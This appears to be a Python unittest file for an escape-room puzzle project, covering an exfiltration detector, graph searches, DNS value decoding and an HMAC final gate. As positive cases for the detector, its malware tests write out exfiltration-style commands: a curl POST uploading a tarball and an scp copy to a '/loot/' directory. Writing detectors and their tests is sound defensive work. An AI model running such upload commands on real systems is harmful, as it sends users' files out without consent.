import unittest

from escaperoom.rooms.malware import is_exfiltration, dfs_path, bfs_path
from escaperoom.rooms.dns import decode_value, solve_dns
from escaperoom.rooms.final_gate import build_message, compute_hmac, solve_final_gate


class TestMalware(unittest.TestCase):

    def test_real_exfiltration(self):  # a real curl upload and a real scp upload should both count
        self.assertTrue(is_exfiltration("curl -X POST http://h/up -d @/tmp/x.tgz"))
        self.assertTrue(is_exfiltration("scp /tmp/x.tgz bob@10.0.0.5:/loot/"))

    def test_decoys_are_rejected(self):  # these mention curl/scp but don't upload anything
        self.assertFalse(is_exfiltration("/usr/bin/curl --help"))
        self.assertFalse(is_exfiltration("/bin/sh -c 'echo curl -X POST'"))
        self.assertFalse(is_exfiltration("/usr/bin/grep scp /etc/motd"))
        self.assertFalse(is_exfiltration("/usr/bin/curl http://127.0.0.1/health"))

    def test_search_survives_a_loop(self):  # small tree with a loop, both searches should still finish
        # 1 -> 2 -> 3 -> 2 is a loop, and 3 -> 4 leads to the attack
        children = {1: [2], 2: [3], 3: [2, 4]}
        commands = {1: "init", 2: "a", 3: "b",
                    4: "curl -X POST http://h/up -d @/tmp/x.tgz"}
        self.assertEqual(dfs_path(1, children, commands, set(), []), [1, 2, 3, 4])
        self.assertEqual(bfs_path(1, children, commands), [1, 2, 3, 4])


class TestDns(unittest.TestCase):

    def test_decode_b64(self):  # example from the brief: Mw== is 3
        self.assertEqual(decode_value("b64:Mw=="), ("b64", "3"))

    def test_decode_rot13_b64(self):  # checks the order is right (rot13 first, then base64)
        # "SGVsbG8=" is Base64 for "Hello"; ROT13 of it is "FTIfoT8="
        self.assertEqual(decode_value("rot13+b64:FTIfoT8="), ("rot13+b64", "Hello"))

    def test_unknown_encoding_raises_error(self):  # an encoding we don't support should give an error
        with self.assertRaises(ValueError):
            decode_value("hex:48656c6c6f")

    def test_token_tag_chooses_the_hint(self):  # token_tag should pick hint5, not just the first hint
        lines = solve_dns("data/dns.cfg")
        self.assertEqual(lines[1], "EVIDENCE[DNS].KEY=hint5")


class TestFinalGate(unittest.TestCase):

    def test_message_follows_token_order(self):  # the order list decides the order, B comes before A here
        tokens = {"A": "x", "B": "y"}
        self.assertEqual(build_message("g1", ["B", "A"], tokens), "g1|y-x")

    def test_missing_token_raises_error(self):  # B is missing so it should raise an error
        with self.assertRaises(ValueError):
            build_message("g1", ["A", "B"], {"A": "x"})

    def test_hmac_known_example(self):
        digest = compute_hmac("key", "The quick brown fox jumps over the lazy dog")
        self.assertEqual(digest, "f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8")

    def test_output_lines_format(self):  # fake tokens, just checking the output looks right
        tokens = {"DNS": "a", "PID": "b", "SAFE": "c", "KEYPAD": "d"}
        lines = solve_final_gate("data/final_gate.txt", tokens)
        self.assertEqual(lines[0], "FINAL_GATE=PENDING")
        self.assertTrue(lines[1].startswith("MSG="))
        digest = lines[2].replace("HMAC=", "")
        self.assertEqual(len(digest), 64)  # sha256 in hex is 64 characters
        self.assertEqual(digest, digest.lower())  # has to be lowercase


if __name__ == "__main__":
    unittest.main()
